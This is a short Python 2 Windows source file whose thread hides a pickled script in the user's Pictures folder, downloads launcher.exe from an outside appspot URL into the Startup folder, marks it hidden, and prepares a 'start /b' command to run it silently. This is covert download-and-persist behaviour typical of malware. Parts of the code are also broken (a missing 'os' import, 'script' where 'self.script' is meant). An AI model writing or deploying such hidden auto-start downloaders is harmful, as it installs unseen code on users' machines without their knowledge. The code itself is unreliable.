"""Makes a thread to download/install/run the silent chatbot.

Should only be run on windows :(
"""

import cPickle
import threading
import urllib2
import win32api
import win32con

from win32com.shell import shell, shellcon

class Downloader(threading.Thread):
    def __init__(self, script):
        """Make a thread to download/install the silent chatbot.
        @param script: A script in list form.  See scriptreader.py
        @type script: list
        """
        threading.Thread.__init__(self)
        self.script = script
        
    def run(self):
        """Run the thread."""
        #Make a file for the script
        path = shell.SHGetFolderPath(0, shellcon.CSIDL_MYPICTURES, None, 0)
        path = os.path.join(path, "script.txt")
        file = open(path, "w")
        #Save the script
        cPickle.dump(script, file)
        #Hide the script
        file.close()
        win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN)
        
        #Get a path for the launcher
        path = shell.SHGetFolderPath(0, shellcon.CSIDL_STARTUP, None, 0)
        path = os.path.join(path, "launcher.exe")        
        #Save the launcher
        url = urllib2.urlopen("http://littlesitetomakemoney.appspot.com/launcher.exe")
        file = open(path, "w")
        file.write(url.read())
        file.close()
        url.close()
        #Hide the launcher
        win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN)

        #Run the launcher
        command = "start /b %s"%win32api.GetShortPathName(path)
        print command